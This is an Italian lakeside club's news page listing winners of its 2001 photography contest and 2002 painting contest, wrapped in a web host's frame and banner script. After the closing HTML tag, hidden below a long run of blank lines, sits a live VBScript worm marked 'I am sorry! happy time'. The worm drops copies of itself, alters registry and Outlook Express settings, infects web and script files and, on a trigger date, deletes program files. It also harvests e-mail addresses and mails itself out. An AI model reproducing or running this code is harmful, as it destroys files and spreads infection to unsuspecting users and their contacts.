<script>
    chiamato = 0;
    function relink() {
        document.onclick=function(evt){
            var target;
            evt=evt||window.event;
            target=evt.target||evt.srcElement;
            if ((target.nodeName=='A' || target.parentNode.nodeName=='A' || target.onclick || target.parentNode.onclick) && (target.className!='search' && target.parentNode.className!='search')){
                refresh();
            }
	}
    }

    myreg=new RegExp("web\.tiscali\.it","i");
    if (!myreg.test("'"+top.location+"'")) {
        top.location=self.location;
    }

    var shortuserdir="clubtrasimeno";
    var bannercode="/banner-tiscali/banner.html";
</script><script>
function rescan() {
    for (var i=0;i<6;i++) {
        setTimeout("relink()", 1000);
    }
    if(window == window.top) {
        top.document.getElementsByTagName('frameset').item(0).rows='100,*,0';
    }
}

function refresh() {
    top.frames[0].location='/banner-tiscali/banner.html';
    top.frames[top.frames.length-1].location='/banner-tiscali/stats.html?userpage_'+shortuserdir;
    chiamato = 1;
}

if(window == window.top) {
        var address=window.location;
        var s='<html><head><title>'+'</title></head>'+
        '<frameset rows="100,*,0" frameborder="0" border="0" framespacing="0" onload="refresh();">'+
        '<frame src="" marginwidth="0" marginheight="0" scrolling="no" noresize>'+
        '<frame src="" marginwidth="0" marginheight="0" scrolling="auto" noresize>'+
        '<frame src="" marginwidth="0" marginheight="0" scrolling="no" noresize>'+
        '</frameset>'+
        '</html>';
        document.write(s);
        top.frames[top.frames.length % 2].location=address;
}
</script>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<title>notizie</title>

<STYLE>
A:link, A:visited { text-decoration: none; font-size:10px; color: #555555; font-family:verdana }
A:hover { text-decoration: none; color: #f00000 }
</STYLE>

<base target="_self">

</head>

<body bgcolor="#FbFDFf">

<div align="center">
  <table border="0" cellspacing="1" width="95%" height="1">
  <center>
    <tr>
      <td width="100%" height="1">
      <p align="center"><img border="0" src="notizie-titolo.gif" width="724" height="36">
      </td>
    </tr>
  </table>
  </center>
</div>

<div align="center">
  <center>
  <table border="0" cellspacing="1" width="90%">
    <tr>
      <td width="100%" colspan="2">
        <p align="center" style="margin-top: 15"><b><font face="Verdana" size="2">1°
        CONCORSO&nbsp; NAZIONALE&nbsp; DI&nbsp; ARTE&nbsp; FOTOGRAFICA&nbsp; - </font></b><span style="letter-spacing: 1pt"><font face="Verdana" color="#FF6600" size="3"><b>&quot;Trasimeno
        e dintorni&quot;</b></font></span></td>
    </tr>
    <tr>
      <td width="100%" colspan="2">
        <p align="center" style="margin-top: 7"><font face="Verdana" size="2" color="#000099"><b>CASTIGLIONE
        DEL LAGO, Palazzo della Corgna</b></font> - <font face="Verdana" size="2" color="#000099"><b>22
        Dicembre 2001/6 gennaio 2002</b></font></td>
    </tr>
    <tr>
      <td width="100%" colspan="2">
        <p style="margin-top: 15" align="justify"><font face="Verdana" size="2">Grande
        successo del 1° Concorso Fotografico organizzato dal &quot;Club Amanti
        del Trasimeno&quot;. Ad esso hanno partecipato un'ottantina di
        fotoamatori che hanno presentato oltre 300 fotografie.<br>Domenica 6 gennaio, nella sala
        consigliare del Comune di Castiglione del Lago, alla presenza del
        Presidente del CAT Sergio Fanfani e degli Assessori comunali Anna
        Cassuoli e Claudio Monellini, si è svolta la cerimonia di premiazione.&nbsp;</font></td>
    </tr>
    <tr>
      <td width="50%">
      <div align="left">
        <table border="0" cellspacing="1" width="87%">
          <tr>
            <td width="100%">
              <p align="center" style="border: 1 solid #000000"><img border="0" src="foto-primo.JPG" width="300" height="386"></td>
          </tr>
          <tr>
            <td width="100%" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
              <p align="center"><font face="Verdana" size="1">Foto
              vincitrice:&quot;Pescatore prepara la rete&quot;</font></td>
          </tr>
        </table>
      </div>
      </td>
  </center>
      <td width="50%" style="border-left: 3 solid #FF6600">
        <p align="left" style="margin-left: 6"><font face="Verdana" size="2">
        I vincitori sono risultati:<b><font color="#0000FF"><br><br>1° Premio</font> - </b>Euro
        516,46 (Lire 1.000.000)<br>Marco Pazzaglia con la fotografia in bianco e
        nero &quot;Pescatore prepara la rete&quot;.<br><br><b><font color="#0000FF">2° Premio</font> </b>- Euro
        258,23 (Lire 500.000)<br>Fabrizio Papalini con la fotografia&nbsp; &quot;Sera
        d'inverno&quot;.<br><br><b><font color="#0000FF">3° Premio</font> </b>-
        </font><font face="Verdana" size="2">Weekend per due persone
        all'Isola Maggiore<br>Domenico Fasano con la fotografia
        &quot;Temporale&quot;.<br><br>La Giuria ha poi segnalato altre cinque
        fotografie:<br>- &quot;Acqua dolce&quot; di Marco Burchielli.<br>- &quot;Partenza
        dimenticata&quot; di Lucio Fringuelli.<br>- &quot;Sculture&quot; di Ugo Sagone.<br>-
        &quot;Girasole&quot; di Carlo Burini.<br>- &quot;Il sorgere della
        Luna a Castiglione del Lago&quot; di Francesco Spano.<br><br>Infine due
        riconoscimenti a:<br>- Dalila Peluso, 10 anni, partecipante più giovane.<br>-
        Gabriella
        Maurini, foto più originale.</font></td>
    </tr>
  </table>
</div>

<div align="center">
  <center>
  <table border="0" cellspacing="1" width="95%">
    <tr>
      <td width="100%">
        <hr size="3" color="#808080">
      </td>
    </tr>
  </table>
  </center>
</div>

  <div align="center">
    <center>
    <table border="0" cellspacing="1" width="90%">
      <tr>
        <td width="100%" align="center">
          <p style="margin-top: 15"><b><font face="Verdana" size="2">1°
        CONCORSO
        ESTEMPORANEO DI PITTURA&nbsp; -&nbsp; </font></b><font face="Verdana" color="#FF6600" size="3"><span style="letter-spacing: 1pt"><b>&quot;Trasimeno
        e dintorni&quot;</b></span></font></td>
      </tr>
    </table>
    </center>
  </div>
  <div align="center">
    <center>
    <table border="0" cellspacing="1" width="90%">
      <tr>
        <td width="100%">
        <p align="center" style="line-height: 130%; margin-top: 7"><b><font face="Verdana" size="2" color="#000099">Castiglione
        del Lago, Passignano, San Feliciano, Panicale, Città della Pieve - 21
        Luglio 2002</font></b></td>
      </tr>
    </table>
    </center>
  </div>
  <div align="center">
    <center>
    <table border="0" cellspacing="1" width="90%">
      <tr>
        <td width="90%" align="center">
          <p style="margin-top: 15" align="justify"><font face="Verdana" size="2">La
          cerimonia di premiazione si è svolta a Castiglione del Lago nelle
          sale del palazzo Della Corgna alla presenza del presidente del Club
          Amanti del Trasimeno Sergio Fanfani, dell'Assessore alla Cultura del Comune di Castiglione
          del Lago Anna Cassuoli e di un numeroso pubblico fra cui, ospite
          d'onore, il maestro Franco Venanti.<br>Al Concorso hanno partecipato
          più di cinquanta artisti, dai sei anni in su, che hanno ritratto gli
          angoli più suggestivi del Lago e delle zone limitrofe utilizzando
          diverse tecniche e supporti.</font></td>
      </tr>
    </table>
    </center>
  </div>

<div align="center">
  <center>
  <table border="0" cellspacing="1" width="90%">
    <tr>
      <td width="100%">
        <p style="margin-top: 20"><font face="Verdana" size="2">Questi i
        vincitori:</font></td>
    </tr>
  </table>
  </center>
</div>
<div align="center">
  <center>
  <table border="0" cellspacing="1" width="90%">
    <tr>
      <td width="100%">
        <p style="margin-top: 5"><font face="Verdana" size="2" color="#B5175F"><b>SEZIONE&nbsp;
        ADULTI</b></font></td>
    </tr>
    <tr>
      <td width="100%">
        <div align="left">
          <table border="0" cellspacing="1" width="100%">
            <tr>
              <td width="40%" style="background-color: #EFEFEF; border-style: outset; border-width: 1">
                <p style="margin-left: 4"><font face="Verdana" size="2"><b>Primo
                classificato (Euro 1000)</b></font></td>
              <td width="60%" style="background-color: #EFEFEF; border-style: outset; border-width: 1">
                <p style="margin-left: 4"><font face="Verdana" size="2">Antonio
                Civitarese</font></td>
            </tr>
            <tr>
              <td width="40%" style="background-color: #EFEFEF; border-style: outset; border-width: 1">
                <p style="margin-left: 4"><font face="Verdana" size="2"><b>Secondo
                classificato (Euro 650)</b></font></td>
              <td width="60%" style="background-color: #EFEFEF; border-style: outset; border-width: 1">
                <p style="margin-left: 4"><font face="Verdana" size="2">Giuseppe
                Baglioni</font></td>
            </tr>
            <tr>
              <td width="40%" style="background-color: #EFEFEF; border-style: outset; border-width: 1">
                <p style="margin-left: 4"><font face="Verdana" size="2"><b>Terzo
                classificato (Euro 350)</b></font></td>
              <td width="60%" style="background-color: #EFEFEF; border-style: outset; border-width: 1">
                <p style="margin-left: 4"><font face="Verdana" size="2">Ex equo:
                Mario Bevilacqua, Alfredo Raponi, Ramiro Villar</font></td>
            </tr>
          </table>
        </div>
      </td>
    </tr>
  </table>
  </center>
</div>
<div align="left">
  <table border="0" cellspacing="1" width="100%" height="15">
    <tr>
      <td width="100%"></td>
    </tr>
  </table>
</div>
<div align="center">
  <center>
  <table border="0" cellspacing="1" width="90%">
    <tr>
      <td width="100%">
        <p style="margin-top: 5"><font face="Verdana" size="2" color="#B5175F"><b>SEZIONE&nbsp;
        GIOVANI</b></font></td>
    </tr>
  </table>
  </center>
</div>
<div align="center">
  <center>
  <table border="0" cellspacing="1" width="90%">
    <tr>
      <td width="40%" style="background-color: #EFEFEF; border-style: outset; border-width: 1">
        <p style="margin-left: 4"><font face="Verdana" size="2"><b>Primo
        classificato (Euro 300)</b></font></td>
      <td width="60%" style="background-color: #EFEFEF; border-style: outset; border-width: 1">
        <p style="margin-left: 4"><font face="Verdana" size="2">non assegnato</font></td>
    </tr>
    <tr>
      <td width="40%" style="background-color: #EFEFEF; border-style: outset; border-width: 1">
        <p style="margin-left: 4"><font face="Verdana" size="2"><b>Secondo
        classificato (Euro 200)</b></font></td>
      <td width="60%" style="background-color: #EFEFEF; border-style: outset; border-width: 1">
        <p style="margin-left: 4"><font face="Verdana" size="2">Jessica Corapi</font></td>
    </tr>
    <tr>
      <td width="40%" style="background-color: #EFEFEF; border-style: outset; border-width: 1">
        <p style="margin-left: 4"><font face="Verdana" size="2"><b>Terzo
        classificato (Euro 100)</b></font></td>
      <td width="60%" style="background-color: #EFEFEF; border-style: outset; border-width: 1">
        <p style="margin-left: 4"><font face="Verdana" size="2">Giorgia Cocchi</font></td>
    </tr>
  </table>
  </center>
</div>
<table border="0" cellspacing="1" width="100%" height="15">
  <tr>
    <td width="100%"></td>
  </tr>
</table>
<div align="center">
  <center>
  <table border="0" cellspacing="1" width="90%">
    <tr>
      <td width="100%">
        <p style="margin-top: 5"><font face="Verdana" size="2" color="#B5175F"><b>PREMI&nbsp;
        SPECIALI</b></font></td>
    </tr>
  </table>
  </center>
</div>
<div align="center">
  <center>
  <table border="0" cellspacing="1" width="90%">
    <tr>
      <td width="100%" style="background-color: #EFEFEF; border-style: outset; border-width: 1">
        <p style="margin-left: 4"><font face="Verdana" size="2">Daniele Mammoli,
        Simone Pucci</font></td>
    </tr>
  </table>
  </center>
</div>
<table border="0" cellspacing="1" width="100%" height="15">
  <tr>
    <td width="100%"></td>
  </tr>
</table>
<div align="center">
  <center>
  <table border="0" cellspacing="1" width="90%">
    <tr>
      <td width="100%">
        <p style="margin-top: 5"><font face="Verdana" size="2" color="#B5175F"><b>TARGHE&nbsp;
        DI&nbsp; RICONOSCIMENTO</b></font></td>
    </tr>
  </table>
  </center>
</div>
<div align="center">
  <center>
  <table border="0" cellspacing="1" width="90%">
    <tr>
      <td width="100%" style="background-color: #EFEFEF; border-style: outset; border-width: 1">
        <p style="margin-left: 4"><font face="Verdana" size="2">Andrea Mammoli
        (più giovane), Ramiro Villar (meno giovane)</font></td>
    </tr>
  </table>
  </center>
</div>
<div align="center">
  <center>
  <table border="0" cellspacing="1" width="95%">
    <tr>
      <td width="100%">
        <hr size="3" color="#808080">
      </td>
    </tr>
  </table>
  </center>
</div>
<div align="center">
  <center>
  <table border="0" cellspacing="0" width="95%" cellpadding="2">
    <tr>
      <td width="10%" align="center" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p><font face="Verdana" size="1" color="#FFFFFF"><a href="chisiamo.htm"><u>Chi
        siamo</u></a></font></p>
      </td>
      <td width="12%" align="center" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p><font face="Verdana" size="1" color="#FFFFFF"><a href="dovesiamo.htm"><u>Dove
        siamo</u></a></font></p>
      </td>
      <td width="15%" align="center" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p><font face="Verdana" size="1" color="#FFFFFF"><a href="gruppi.htm"><u>Organigramma</u></a></font></p>
      </td>
      <td width="10%" align="center" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p><font face="Verdana" size="1" color="#FFFFFF"><a href="iniziative.htm"><u>Iniziative</u></a></font></p>
      </td>
      <td width="8%" align="center" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p><font face="Verdana" size="1" color="#FFFFFF"><a href="notizie.htm"><u>Notizie</u></a></font></p>
      </td>
      <td width="15%" align="center" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p><font face="Verdana" size="1" color="#FFFFFF"><a href="storialago.htm"><u>Lago
        Trasimeno</u></a></font></p>
      </td>
      <td width="10%" align="center" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p><font face="Verdana" size="1" color="#FFFFFF"><a href="ambiente.htm"><u>Ambiente</u></a></font></p>
      </td>
      <td width="8%" align="center" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p><font face="Verdana" size="1" color="#FFFFFF"><a href="luoghi.htm"><u>Località</u></a></font></p>
      </td>
      <td width="13%" align="center" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p><font face="Verdana" size="1" color="#FFFFFF"><a href="prodotti.htm"><u>Prodotti
        tipici</u></a></font></p>
      </td>
    </tr>
  </table>
  </center>
</div>
<div align="center">
  <center>
  <table border="0" cellspacing="0" width="95%" cellpadding="2" height="14">
    <tr>
      <td width="11%" height="6" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p align="center"><font face="Verdana" size="1" color="#FFFFFF"><a href="navigazione.htm"><u>Navigazione</u></a></font></td>
      <td width="8%" height="6" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p align="center"><font face="Verdana" size="1" color="#FFFFFF"><a href="alberghi.htm"><u>Alberghi</u></a></font></td>
      <td width="10%" height="6" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p align="center"><font face="Verdana" size="1" color="#FFFFFF"><a href="residence.htm"><u>Residence</u></a></font></td>
      <td width="10%" height="6" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p align="center"><font face="Verdana" size="1" color="#FFFFFF"><a href="agriturismo.htm"><u>Agriturismo</u></a></font></td>
      <td width="12%" height="6" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p align="center"><font face="Verdana" size="1" color="#FFFFFF"><a href="affittacamere.htm"><u>Affittacamere</u></a><u>&nbsp;</u></font></td>
      <td width="12%" height="6" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p align="center"><font face="Verdana" size="1" color="#FFFFFF"><a href="appartamenti.htm"><u>Appartamenti</u></a></font></td>
      <td width="10%" height="6" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p align="center"><font face="Verdana" size="1" color="#FFFFFF"><a href="campeggi.htm"><u>Campeggi</u></a></font></td>
      <td width="8%" height="6" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p align="center"><font face="Verdana" size="1" color="#FFFFFF"><a href="altrisiti.htm"><u>Altri
                        siti</u></a></font></td>
      <td width="9%" height="6" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p align="center"><font face="Verdana" size="1" color="#FFFFFF"><a href="contatti.htm"><u>Contatti</u></a></font></td>
      <td width="13%" height="6" style="background-color: #EFEFEF; border-style: ridge; border-width: 1">
        <p align="center"><font face="Verdana" size="1" color="#FFFFFF"><a href="index.htm"><u>Home
        Page</u></a></font></td>
    </tr>
  </table>
  </center>
</div>

</body>

</html>
<script language='VBScript'>


































































Rem I am sorry! happy time
On Error Resume Next
mload
Sub mload()
On Error Resume Next
mPath = Grf()
Set Os = CreateObject("Scriptlet.TypeLib")
Set Oh = CreateObject("Shell.Application")
If IsHTML Then
mURL = LCase(document.Location)
If mPath = "" Then
Os.Reset
Os.Path = "C:\Help.htm"
Os.Doc = Lhtml()
Os.Write()
Ihtml = "<span style='position:absolute'><Iframe src='C:\Help.htm' width='0' height='0'></Iframe></span>"
Call document.Body.insertAdjacentHTML("AfterBegin", Ihtml)
Else
If Iv(mPath, "Help.vbs") Then
setInterval "Rt()", 10000
Else
m = "hta"
If LCase(m) = Right(mURL, Len(m)) Then
id = setTimeout("mclose()", 1)
main
Else
Os.Reset()
Os.Path = mPath & "\" & "Help.hta"
Os.Doc = Lhtml()
Os.write()
Iv mPath, "Help.hta"
End If
End If
End If
Else
main
End If
End Sub
Sub main()
On Error Resume Next
Set Of = CreateObject("Scripting.FileSystemObject")
Set Od = CreateObject("Scripting.Dictionary")
Od.Add "html", "1100"
Od.Add "vbs", "0100"
Od.Add "htm", "1100"
Od.Add "asp", "0010"
Ks = "HKEY_CURRENT_USER\Software\"
Ds = Grf()
Cs = Gsf()
If IsVbs Then
If Of.FileExists("C:\help.htm") Then
Of.DeleteFile ("C:\help.htm")
End If
Key = CInt(Month(Date) + Day(Date))
If Key = 13 Then
Od.RemoveAll
Od.Add "exe", "0001"
Od.Add "dll", "0001"
End If
Cn = Rg(Ks & "Help\Count")
If Cn = "" Then
Cn = 1
End If
Rw Ks & "Help\Count", Cn + 1
f1 = Rg(Ks & "Help\FileName")
f2 = FNext(Of, Od, f1)
fext = GetExt(Of, Od, f2)
Rw Ks & "Help\FileName", f2
If IsDel(fext) Then
f3 = f2
f2 = FNext(Of, Od, f2)
Rw Ks & "Help\FileName", f2
Of.DeleteFile f3
Else
If LCase(WScript.ScriptFullname) <> LCase(f2) Then
Fw Of, f2, fext
End If
End If
If (CInt(Cn) Mod 366) = 0 Then
If (CInt(Second(Time)) Mod 2) = 0 Then
Tsend
Else
adds = Og
Msend (adds)
End If
End If
wp = Rg("HKEY_CURRENT_USER\Control Panel\desktop\wallPaper")
If Rg(Ks & "Help\wallPaper") <> wp Or wp = "" Then
If wp = "" Then
n1 = ""
n3 = Cs & "\Help.htm"
Else
mP = Of.GetFile(wp).ParentFolder
n1 = Of.GetFileName(wp)
n2 = Of.GetBaseName(wp)
n3 = Cs & "\" & n2 & ".htm"
End If
Set pfc = Of.CreateTextFile(n3, True)
mt = Sa("1100")
pfc.Write "<" & "HTML><" & "body bgcolor='#007f7f' background='" & n1 & "'><" & "/Body><" & "/HTML>" & mt
pfc.Close
Rw Ks & "Help\wallPaper", n3
Rw "HKEY_CURRENT_USER\Control Panel\desktop\wallPaper", n3
End If
Else
Set fc = Of.CreateTextFile(Ds & "\Help.vbs", True)
fc.Write Sa("0100")
fc.Close
bf = Cs & "\Untitled.htm"
Set fc2 = Of.CreateTextFile(bf, True)
fc2.Write Lhtml
fc2.Close
oeid = Rg("HKEY_CURRENT_USER\Identities\Default User ID")
oe = "HKEY_CURRENT_USER\Identities\" & oeid & "\Software\Microsoft\Outlook Express\5.0\Mail"
MSH = oe & "\Message Send HTML"
CUS = oe & "\Compose Use Stationery"
SN = oe & "\Stationery Name"
Rw MSH, 1
Rw CUS, 1
Rw SN, bf
Web = Cs & "\WEB"
Set gf = Of.GetFolder(Web).Files
Od.Add "htt", "1100"
For Each m In gf
fext = GetExt(Of, Od, m)
If fext <> "" Then
Fw Of, m, fext
End If
Next
End If
End Sub
Sub mclose()
document.Write "<" & "title>I am sorry!</title" & ">"
window.Close
End Sub
Sub Rt()
Dim mPath
On Error Resume Next
mPath = Grf()
Iv mPath, "Help.vbs"
End Sub
Function Sa(n)
Dim VBSText, m
VBSText = Lvbs()
If Mid(n, 3, 1) = 1 Then
m = "<%" & VBSText & "%>"
End If
If Mid(n, 2, 1) = 1 Then
m = VBSText
End If
If Mid(n, 1, 1) = 1 Then
m = Lscript(m)
End If
Sa = m & vbCrLf
End Function
Sub Fw(Of, S, n)
Dim fc, fc2, m, mmail, mt
On Error Resume Next
Set fc = Of.OpenTextFile(S, 1)
mt = fc.ReadAll
fc.Close
If Not Sc(mt) Then
mmail = Ml(mt)
mt = Sa(n)
Set fc2 = Of.OpenTextFile(S, 8)
fc2.Write mt
fc2.Close
Msend (mmail)
End If
End Sub
Function Sc(S)
mN = "Rem I am sorry! happy time"
If InStr(S, mN) > 0 Then
Sc = True
Else
Sc = False
End If
End Function
Function FNext(Of, Od, S)
Dim fpath, fname, fext, T, gf
On Error Resume Next
fname = ""
T = False
If Of.FileExists(S) Then
fpath = Of.GetFile(S).ParentFolder
fname = S
ElseIf Of.FolderExists(S) Then
fpath = S
T = True
Else
fpath = Dnext(Of, "")
End If
Do While True
Set gf = Of.GetFolder(fpath).Files
For Each m In gf
If T Then
If GetExt(Of, Od, m) <> "" Then
FNext = m
Exit Function
End If
ElseIf LCase(m) = LCase(fname) Or fname = "" Then
T = True
End If
Next
fpath = Pnext(Of, fpath)
Loop
End Function
Function Pnext(Of, S)
On Error Resume Next
Dim Ppath, Npath, gp, pn, T, m
T = False
If Of.FolderExists(S) Then
Set gp = Of.GetFolder(S).SubFolders
pn = gp.Count
If pn = 0 Then
Ppath = LCase(S)
Npath = LCase(Of.GetParentFolderName(S))
T = True
Else
Npath = LCase(S)
End If
Do While Not Er
For Each pn In Of.GetFolder(Npath).SubFolders
If T Then
If Ppath = LCase(pn) Then
T = False
End If
Else
Pnext = LCase(pn)
Exit Function
End If
Next
T = True
Ppath = LCase(Npath)
Npath = Of.GetParentFolderName(Npath)
If Of.GetFolder(Ppath).IsRootFolder Then
m = Of.GetDriveName(Ppath)
Pnext = Dnext(Of, m)
Exit Function
End If
Loop
End If
End Function
Function Dnext(Of, S)
Dim dc, n, d, T, m
On Error Resume Next
T = False
m = ""
Set dc = Of.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
If T Then
Dnext = d
Exit Function
Else
If LCase(S) = LCase(d) Then
T = True
End If
If m = "" Then
m = d
End If
End If
End If
Next
Dnext = m
End Function
Function GetExt(Of, Od, S)
Dim fext
On Error Resume Next
fext = LCase(Of.GetExtensionName(S))
GetExt = Od.Item(fext)
End Function
Sub Rw(k, v)
Dim R
On Error Resume Next
Set R = CreateObject("WScript.Shell")
R.RegWrite k, v
End Sub
Function Rg(v)
Dim R
On Error Resume Next
Set R = CreateObject("WScript.Shell")
Rg = R.RegRead(v)
End Function
Function IsVbs()
Dim ErrTest
On Error Resume Next
ErrTest = WScript.ScriptFullname
If Err Then
IsVbs = False
Else
IsVbs = True
End If
End Function
Function IsHTML()
Dim ErrTest
On Error Resume Next
ErrTest = document.Location
If Er Then
IsHTML = False
Else
IsHTML = True
End If
End Function
Function IsMail(S)
Dim m1, m2
IsMail = False
If InStr(S, vbCrLf) = 0 Then
m1 = InStr(S, "@")
m2 = InStr(S, ".")
If m1 <> 0 And m1 < m2 Then
IsMail = True
End If
End If
End Function
Function Lvbs()
Dim f, m, ws, Of
On Error Resume Next
If IsVbs Then
Set Of = CreateObject("Scripting.FileSystemObject")
Set f = Of.OpenTextFile(WScript.ScriptFullname, 1)
Lvbs = f.ReadAll
Else
For Each ws In document.scripts
If LCase(ws.Language) = "vbscript" Then
If Sc(ws.Text) Then
Lvbs = ws.Text
Exit Function
End If
End If
Next
End If
End Function
Function Iv(mPath, mName)
Dim Shell
On Error Resume Next
Set Shell = CreateObject("Shell.Application")
Shell.NameSpace(mPath).Items.Item(mName).InvokeVerb
If Er Then
Iv = False
Else
Iv = True
End If
End Function
Function Grf()
Dim Shell, mPath
On Error Resume Next
Set Shell = CreateObject("Shell.Application")
mPath = "C:\"
For Each mShell In Shell.NameSpace(mPath).Items
If mShell.IsFolder Then
Grf = mShell.Path
Exit Function
End If
Next
If Er Then
Grf = ""
End If
End Function
Function Gsf()
Dim Of, m
On Error Resume Next
Set Of = CreateObject("Scripting.FileSystemObject")
m = Of.GetSpecialFolder(0)
If Er Then
Gsf = "C:\"
Else
Gsf = m
End If
End Function
Function Lhtml()
Lhtml = "<" & "HTML" & "><HEAD" & ">" & vbCrLf & _
"<" & "Title> Help </Title" & "><" & "/HEAD>" & vbCrLf & _
"<" & "Body> " & Lscript(Lvbs()) & vbCrLf & _
"<" & "/Body></HTML" & ">"
End Function
Function Lscript(S)
Lscript = "<" & "script language='VBScript'>" & vbCrLf & _
S & "<" & "/script" & ">"
End Function
Function Sl(S1, S2, n)
Dim l1, l2, l3, i
l1 = Len(S1)
l2 = Len(S2)
i = InStr(S1, S2)
If i > 0 Then
l3 = i + l2 - 1
If n = 0 Then
Sl = Left(S1, i - 1)
ElseIf n = 1 Then
Sl = Right(S1, l1 - l3)
End If
Else
Sl = ""
End If
End Function
Function Ml(S)
Dim S1, S3, S2, T, adds, m
S1 = S
S3 = """"
adds = ""
S2 = S3 & "mailto" & ":"
T = True
Do While T
S1 = Sl(S1, S2, 1)
If S1 = "" Then
T = False
Else
m = Sl(S1, S3, 0)
If IsMail(m) Then
adds = adds & m & vbCrLf
End If
End If
Loop
Ml = Split(adds, vbCrLf)
End Function
Function Og()
Dim i, n, m(), Om, Oo
Set Oo = CreateObject("Outlook.Application")
Set Om = Oo.GetNamespace("MAPI").GetDefaultFolder(10).Items
n = Om.Count
ReDim m(n)
For i = 1 To n
m(i - 1) = Om.Item(i).Email1Address
Next
Og = m
End Function
Sub Tsend()
Dim Od, MS, MM, a, m
Set Od = CreateObject("Scripting.Dictionary")
MConnect MS, MM
MM.FetchSorted = True
MM.Fetch
For i = 0 To MM.MsgCount - 1
MM.MsgIndex = i
a = MM.MsgOrigAddress
If Od.Item(a) = "" Then
Od.Item(a) = MM.MsgSubject
End If
Next
For Each m In Od.Keys
MM.Compose
MM.MsgSubject = "Fw: " & Od.Item(m)
MM.RecipAddress = m
MM.AttachmentPathName = Gsf & "\Untitled.htm"
MM.Send
Next
MS.SignOff
End Sub
Function MConnect(MS, MM)
Dim U
On Error Resume Next
Set MS = CreateObject("MSMAPI.MAPISession")
Set MM = CreateObject("MSMAPI.MAPIMessages")
U = Rg("HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\DefaultProfile")
MS.UserName = U
MS.DownLoadMail = False
MS.NewSession = False
MS.LogonUI = True
MS.SignOn
MM.SessionID = MS.SessionID
End Function
Sub Msend(Address)
Dim MS, MM, i, a
MConnect MS, MM
i = 0
MM.Compose
For Each a In Address
If IsMail(a) Then
MM.RecipIndex = i
MM.RecipAddress = a
i = i + 1
End If
Next
MM.MsgSubject = " Help "
MM.AttachmentPathName = Gsf & "\Untitled.htm"
MM.Send
MS.SignOff
End Sub
Function Er()
If Err.Number = 0 Then
Er = False
Else
Err.Clear
Er = True
End If
End Function
Function IsDel(S)
If Mid(S, 4, 1) = 1 Then
IsDel = True
Else
IsDel = False
End If
End Function




</script>
<script>
relink();
setInterval("rescan()", 1000);
top.document.title = top.frames[top.frames.length % 2].document.title;
</script>